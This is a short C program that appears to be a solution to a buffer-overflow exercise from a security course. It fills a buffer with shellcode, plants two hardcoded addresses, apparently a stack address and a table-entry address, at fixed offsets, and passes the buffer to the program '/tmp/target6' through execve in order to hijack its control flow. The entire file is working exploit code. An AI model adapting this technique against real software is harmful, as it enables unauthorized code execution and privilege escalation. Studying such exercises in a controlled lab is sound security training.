#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target6"

int main(void)
{
  char exploit[200];
  memset(exploit, 0x42, sizeof(exploit));

  int *p_p = (int *)(exploit + 60);
  *p_p = 0x804a00c;

  int *a_p = (int *)(exploit + 56);
  *a_p = 0xbffffcc0;

  memcpy(exploit, shellcode, sizeof(shellcode) - 1);

  char *args[] = { TARGET, exploit, NULL };
  char *env[] = { NULL };
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
